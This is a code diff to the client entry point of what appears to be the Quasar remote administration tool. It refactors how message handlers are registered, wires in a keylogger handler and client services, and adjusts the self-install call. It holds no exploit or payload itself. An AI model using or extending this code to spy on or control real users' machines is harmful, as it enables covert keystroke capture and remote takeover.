@@ -2,23 +2,27 @@
 using Quasar.Client.Config;
 using Quasar.Client.Data;
 using Quasar.Client.Helper;
-using Quasar.Client.Installation;
+using Quasar.Client.Setup;
 using Quasar.Client.IO;
 using Quasar.Client.Networking;
 using Quasar.Client.Utilities;
 using Quasar.Common.Helpers;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Client.Messages;
+using Quasar.Common.Messages;
 
 namespace Quasar.Client
 {
     internal static class Program
     {
         public static QuasarClient ConnectClient;
+        private static readonly List<IMessageProcessor> MessageProcessors = new List<IMessageProcessor>();
         private static ApplicationContext _msgLoop;
 
         [STAThread]
@@ -73,6 +77,7 @@ namespace Quasar.Client
 
         private static void Cleanup()
         {
+            CleanupMessageProcessors();
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
@@ -85,6 +90,24 @@ namespace Quasar.Client
                 _msgLoop = null;
             }
             MutexHelper.CloseMutex();
+        }
+
+        private static void InitializeMessageProcessors(QuasarClient client)
+        {
+            MessageProcessors.Add(new ClientServicesHandler(ConnectClient));
+            MessageProcessors.Add(new KeyloggerHandler());
+            
+            foreach(var msgProc in MessageProcessors)
+                MessageHandler.Register(msgProc);
+        }
+
+        private static void CleanupMessageProcessors()
+        {
+            foreach (var msgProc in MessageProcessors)
+            {
+                MessageHandler.Unregister(msgProc);
+                msgProc.Dispose();
+            }
         }
 
         private static bool Initialize()
@@ -142,12 +165,13 @@ namespace Quasar.Client
                 }
 
                 ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
+                InitializeMessageProcessors(ConnectClient);
                 return true;
             }
             else
             {
                 MutexHelper.CloseMutex();
-                ClientInstaller.Install(ConnectClient);
+                new ClientInstaller().Install(ConnectClient);
                 return false;
             }
         }
